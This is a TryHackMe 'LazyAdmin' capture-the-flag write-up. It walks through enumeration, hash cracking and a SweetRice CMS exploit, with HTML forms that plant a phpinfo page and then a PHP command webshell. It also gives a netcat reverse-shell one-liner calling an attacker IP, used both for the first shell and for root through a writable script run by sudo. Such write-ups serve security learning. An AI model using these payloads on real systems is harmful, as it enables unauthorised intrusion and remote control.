---
title: "TryHackMe - LazyAdmin"
date: 2025-04-27 12:00:00 +0000
categories: ["CTF", "TryHackMe"]
tags: ["linux", "fuzzing", "enumeration", "sweetrice", "privesc"]
image:
  path: /assets/images/lazyadmin/banner.png
---

![](/assets/images/lazyadmin/banner.png)

## initial Enumeration

```bash
~$ >> nmap -sCV 10.10.115.33
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-19 01:26 WAT
Nmap scan report for 10.10.115.33
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.12 seconds
```

- visit port `80`:

![](/assets/images/lazyadmin/01_apache_default.png)

- now let FUZZ for hidden directory:
```bash
ffuf -u http://10.10.115.33/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 11321
```

![](/assets/images/lazyadmin/02_ffuf_root.png)

- we found `/contents` let see what's there:

![](/assets/images/lazyadmin/03_sweetrice_notice.png)

- nothing much there let `fuzz` for sub-directories here:

```bash
ffuf -u http://10.10.115.33/content/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -fs 2198
```

![](/assets/images/lazyadmin/04_ffuf_content.png)

- okay i was checking the directories one-by-one and found some cool stuff in the `/content/inc/` and `/content/as/`

![](/assets/images/lazyadmin/05_index_content_inc.png)

![](/assets/images/lazyadmin/06_index_mysql_backup.png)

![](/assets/images/lazyadmin/07_sql_backup_creds.png)

- i found a hash in the `databasefile` , now let crack it:
- the hash is likely an `md5` hash

![](/assets/images/lazyadmin/08_hashid.png)

![](/assets/images/lazyadmin/09_john_crack.png)

- no going to the `/content/as` directory it has a log-in form so i test the manager creds i just crack and it works:

![](/assets/images/lazyadmin/10_sweetrice_dashboard.png)


- from the above screen i was able to see the version of the `SweetRice` CMS, so i searched for possible exploit:

![](/assets/images/lazyadmin/11_google_sweetrice_exploit.png)

![](/assets/images/lazyadmin/12_exploit_code.png)

- i edited the code to fit my need:

```html

<html>
<body onload="document.exploit.submit();">
<form action="http://10.10.115.33/content/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="hacked"/>
<textarea type="hidden" name="adv">
<?php
echo '<h1> Hacked </h1>';
phpinfo();?>
&lt;/textarea&gt;
</form>
</body>
</html>

<!--
# After HTML File Executed You Can Access Page In
http://10.10.115.33/content/inc/ads/hacked.php
  -->
```

- i save the exploit into a `.html` file and on my terminal i run `Firefox <filename.html>` , this will open up Firefox and execute the payload against the `SweetRice` server:

![](/assets/images/lazyadmin/13_firefox_trigger.png)

- when it open up your Firefox click on the tick sign and visit  `http://10.10.115.33/content/inc/ads/hacked.php` to confirm the `POC`:

![](/assets/images/lazyadmin/14_phpinfo_poc.png)

- now i can modify the exploit to get a webshell/reverse shell:

```html 
<html>
<body onload="document.exploit.submit();">
<form action="http://10.10.115.33/content/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="webshell"/>
<textarea type="hidden" name="adv">
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>

</form>
</body>
</html>

<!--
# After HTML File Executed You Can Access Page In
http://10.10.115.33/content/inc/ads/webshell.php
  -->

```

- i save the exploit into a `.html` file and on my terminal i run `Firefox <filename.html>` , this will open up Firefox and execute the payload against the `SweetRice` server:

- when it open up Firefox don't forget to click on the tick box and visit the url `http://10.10.115.33/content/inc/ads/webshell.php`

![](/assets/images/lazyadmin/15_sweetrice_ads_webshell.png)

![](/assets/images/lazyadmin/16_webshell_exec.png)

- now i can start up a listener and enter in this reverse shell command:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.3.128 1337 >/tmp/f
```

![](/assets/images/lazyadmin/17_reverse_shell.png)

- stabilize shell with:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL Z [KEY]
stty raw -echo;fg
export TERM=xterm
stty rows 40 cols 160
```

- now we are in we can move to the `/homes` directory to check if we have permission to read the user flag:

![](/assets/images/lazyadmin/18_user_flag.png)

- and surprisingly we do 😂

## privilege Escalation:

running `sudo -l` i see that the `itguy` user can run sudo with a perl binary combined ith a file in his directory:

![](/assets/images/lazyadmin/19_sudo_l.png)

- but the `itguy` user don't have `WRITE` permission to the file only read
-  so i check the content of the file and found that that file is execute another file the the `itguy` has `WRITE` permissions too 🥲:

![](/assets/images/lazyadmin/20_backup_pl.png)

- so what i we have to do is change the content of the `copy.sh` file to a reverse shell code so when it execute we will get a root shell:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.3.128 1336 >/tmp/f
```

![](/assets/images/lazyadmin/21_nano_copy_sh.png)

- then execute the command we have sudo privilege with (start listener first):

![](/assets/images/lazyadmin/22_run_backup_pl.png)

![](/assets/images/lazyadmin/23_root_reverse_shell.png)

- root flag:

![](/assets/images/lazyadmin/24_root_flag.png)

## Thanks For reading 🤗
